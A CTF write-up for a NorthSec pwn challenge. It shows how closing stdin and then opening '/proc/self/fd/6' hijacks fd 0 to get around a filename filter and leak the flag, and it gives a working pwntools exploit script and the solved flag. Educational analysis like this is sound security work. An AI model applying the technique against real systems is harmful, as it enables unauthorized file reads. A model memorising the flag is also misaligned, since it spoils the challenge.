# 🧠 Archivist’s Ritual — Advanced Pwn Writeup

![CTF](https://img.shields.io/badge/CTF-NorthSec-blue)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Exploit](https://img.shields.io/badge/Exploit-FD%20Hijacking-critical)

---

## 📜 Description

We are given a binary exposing an interactive interface:

```
=== Archivist Interface ===
1. Invoke prophecy
2. Seal channel
3. Summon scroll
4. Exit
```

The objective is to retrieve the hidden flag stored in `secret_scroll.txt`, while a filter prevents direct access to any filename containing `"secret"`.

---

## 🔍 Binary Analysis

### 🛡️ Security Protections

```
RELRO:      Partial
Canary:     No
NX:         Enabled
PIE:        Enabled
```

👉 No trivial stack-based exploitation → **logic vulnerability expected**

---

## 🧩 Reverse Engineering Insights

### 🔹 Initialization

```c
control_fd = dup(0);
```

👉 The program duplicates `stdin` and stores it in `control_fd`

---

### 🔹 Input Handling

```c
read(control_fd, buf, size);
```

👉 All user inputs are read from `control_fd`

---

### ⚠️ Critical Inconsistency

```c
// Option 1: Invoke prophecy
read(0, buf, 0x100);
printf("Vision: %s\n", buf);
```

👉 **Reads directly from fd 0 (stdin)** instead of `control_fd`

💡 This inconsistency is the core vulnerability.

---

### 🔹 Seal Channel

```c
fd = (input ^ 0x1337) & 3;
close(fd);
```

👉 Allows closing one of:

```
fd ∈ {0, 1, 2, 3}
```

---

### 🔹 Summon Scroll

```c
if (strstr(name, "secret"))
    exit(0);

fd = open(name, 0);
```

👉 Direct access to `secret_scroll.txt` is blocked

---

## 💣 Vulnerability

The binary suffers from a **File Descriptor Confusion / Hijacking vulnerability**:

- We can **close fd 0 (stdin)**
- Then **open another file**, which will reuse fd 0
- The program then reads from this file via `read(0, ...)`

👉 This results in an **arbitrary file read primitive**

---

## ⚔️ Exploitation Strategy

### 🎯 Objective

Redirect `fd 0` to a file descriptor containing the flag.

---

## 🚀 Exploitation Steps

### 1️⃣ Close stdin (fd 0)

We solve:

```
(input ^ 0x1337) & 3 == 0
```

Since:

```
0x1337 mod 4 = 3
```

We get:

```
input mod 4 = 3
```

👉 Valid input:

```
3
```

---

### 2️⃣ Reassign fd 0

Linux assigns the **lowest available fd** on `open()`.

After closing fd 0:

```
open(...) → fd = 0
```

---

### 3️⃣ Abuse `/proc/self/fd`

We access already-opened file descriptors:

```
/proc/self/fd/N
```

Bruteforcing reveals:

```
/proc/self/fd/6 → valid and contains the flag
```

---

### 4️⃣ Redirect stdin

We open:

```
/proc/self/fd/6
```

👉 This becomes:

```
fd 0 → /proc/self/fd/6
```

---

### 5️⃣ Leak the flag

Trigger:

```
1 → Invoke prophecy
```

Which executes:

```c
read(0, buf, ...);
printf("Vision: %s\n", buf);
```

👉 Now reading from fd 0 (our hijacked descriptor)

---

## 💻 Exploit Script

```python
from pwn import *
import re
import time

HOST = "34.123.57.171"
PORT = 41040

io = remote(HOST, PORT)

# Step 1: Close fd 0
io.recvuntil(b'> ')
io.sendline(b'2')
io.recvuntil(b'Channel rune: ')
io.sendline(b'3')

# Step 2: Open target fd
io.recvuntil(b'> ')
io.sendline(b'3')
io.recvuntil(b'Scroll name: ')
io.send(b'/proc/self/fd/6')  # no newline
time.sleep(0.2)

# Step 3: Trigger leak
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'The oracle whispers: ')
io.sendline(b'A')

output = io.recvrepeat(1.0).decode(errors='ignore')
print(output)

flag = re.search(r'NSC\{.*?\}', output)
if flag:
    print("FLAG:", flag.group(0))
```

---

## 🧠 Key Takeaways

- ⚠️ Mixing `stdin` and duplicated file descriptors is dangerous
- 🧠 File descriptor manipulation can lead to powerful exploits
- 🔥 `/proc/self/fd` is a classic and effective bypass technique
- 🧬 Not all pwn challenges require memory corruption

---

## 🏁 Final Flag

```
NSC{7a75abc7dfe6fed1db994662676055d8}
```

---

## 🏆 Conclusion

This challenge demonstrates a subtle but powerful exploitation technique:

> **File Descriptor Hijacking via Logical Inconsistency**

No buffer overflow. No ROP. Just pure reasoning.

🔥 Elegant. Minimal. Deadly.
